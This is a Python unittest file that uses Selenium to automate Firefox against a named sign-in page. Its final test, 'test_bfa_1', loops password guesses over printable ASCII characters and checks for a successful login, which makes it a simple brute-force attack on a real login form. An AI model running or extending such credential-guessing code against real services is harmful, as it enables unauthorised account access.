import time
import warnings
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import unittest
import subprocess
import string

username = ""
password = ""
url = ""


class UnitTestsRPADiversInsightV2(unittest.TestCase):
    # ok
    def test_close_all_processes(self):
        print('test_close_all_processes')

        subprocess.run('taskkill /f /im firefox.exe')
        subprocess.run('taskkill /f /im geckodriver.exe')

    # ok
    def test_open_one_page(self):
        print('test_open_one_page')

        url = 'https://s-insight.optimzen.com/account/signin?next=/'

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = False
        browser = webdriver.Firefox(
            executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        browser.maximize_window()

        time.sleep(5)

        # open
        browser.get(url)

        time.sleep(5)

    # ok
    def test_connect(self):
        print('test_connect')

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = False
        browser = webdriver.Firefox(
            executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        browser.maximize_window()

        time.sleep(5)

        # open
        browser.get(url)

        time.sleep(10)

        # Insert the email
        email_input = browser.find_element(
            by=By.XPATH,
            value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[1]/input"
        )
        email_input.send_keys(username)

        time.sleep(1)

        # Insert the password
        password_input = browser.find_element(
            by=By.XPATH,
            value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[2]/input"
        )
        password_input.send_keys(password)

        time.sleep(1)

        # Click on the 'Sign in' button
        sign_in_button = browser.find_element(
            by=By.XPATH,
            value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/button"
        )
        sign_in_button.click()

        time.sleep(1)

        if "Invalid email or password." in browser.find_element(by=By.XPATH, value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong").text:
            print("no connection")
        else:
            print("connection")

    # ok
    def test_bfa_1(self):
        print('test_bfa_1')

        printable_ascii_characters = string.printable

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = True
        browser = webdriver.Firefox(
            executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        browser.maximize_window()

        time.sleep(5)

        # open
        browser.get(url)

        time.sleep(10)

        for c1 in printable_ascii_characters:
            _password = c1

            # Insert the email
            email_input = browser.find_element(
                by=By.XPATH,
                value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[1]/input"
            )
            email_input.send_keys(username)

            time.sleep(1)

            # Insert the password
            password_input = browser.find_element(
                by=By.XPATH,
                value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[2]/input"
            )
            password_input.send_keys(_password)

            time.sleep(1)

            # Click on the 'Sign in' button
            sign_in_button = browser.find_element(
                by=By.XPATH,
                value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/button"
            )
            sign_in_button.click()

            time.sleep(1)

            if "Invalid email or password." in browser.find_element(by=By.XPATH, value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong").text:
                print("no connection : " + str(_password))
            else:
                print("connection : " + str(_password))
                break


if __name__ == '__main__':
    unittest.main()
